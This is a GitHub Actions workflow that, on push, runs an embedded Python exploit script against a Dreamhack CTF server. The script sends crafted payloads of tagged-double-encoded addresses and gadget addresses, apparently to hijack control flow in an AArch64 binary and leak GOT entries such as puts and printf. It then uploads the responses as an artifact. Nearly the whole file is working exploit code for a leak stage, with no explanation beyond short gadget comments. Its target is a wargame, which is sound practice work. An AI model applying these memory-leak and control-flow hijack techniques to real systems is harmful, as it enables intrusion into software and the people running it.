name: dh103-leak-temporary
on:
  push:
    branches: [implementation/evidence-roadmap]
jobs:
  probe:
    runs-on: ubuntu-24.04
    steps:
      - name: Probe alternate raw leak candidates
        env:
          HOST: host3.dreamhack.games
          PORT: '13825'
        run: |
          python - <<'PY' > dh103-leak.txt
          import socket, struct, time, base64, json, os
          host=os.environ['HOST']; port=int(os.environ['PORT'])
          def dw(addr, tag=0x3f):
              y=(tag<<56)|(addr & ((1<<56)-1))
              return repr(struct.unpack('<d',struct.pack('<Q',y))[0])
          def run(name, pc, x19, x20, x21=0, tag=0x3f):
              args=['0']*9
              args[4]=dw(0x4130d8,tag)
              args[5]=dw(pc,tag)
              args[6]=dw(x19,tag)
              args[7]=dw(x20,tag)
              args[8]='0' if x21==0 else dw(x21,tag)
              payload=(str(9<<7)+'\n'+'\n'.join(args)+'\n').encode()
              s=socket.create_connection((host,port),timeout=5); s.settimeout(2)
              data=b''
              try:
                  data+=s.recv(4096); s.sendall(payload)
                  end=time.time()+2
                  while time.time()<end:
                      try: b=s.recv(4096)
                      except socket.timeout: break
                      if not b: break
                      data+=b
              finally: s.close()
              print(json.dumps({'name':name,'tag':hex(tag),'hex':data.hex(),'b64':base64.b64encode(data).decode()},sort_keys=True))
          # 400fd4: x0=x19+8; 401628 loads x3=[x19+0x18].
          # x19=0x4130a0 -> x3=puts@GOT, x0=0x4130a8 (_Znwm@GOT).
          for tag in (0x3f,0x40,0xbf,0xc0):
              run('puts_new_got_via_400fd4',0x400fd4,0x4130a0,0x4130a0,0,tag)
          # Control: old 4015dc puts(printf@GOT) with alternate tags.
          for tag in (0x40,0xbf,0xc0):
              run('puts_printf_got_via_4015dc',0x4015dc,0x413078,0x4130d8,0x4130d8,tag)
          PY
          cat dh103-leak.txt
      - uses: actions/upload-artifact@v4
        with:
          name: dh103-leak-temporary
          path: dh103-leak.txt
          if-no-files-found: error
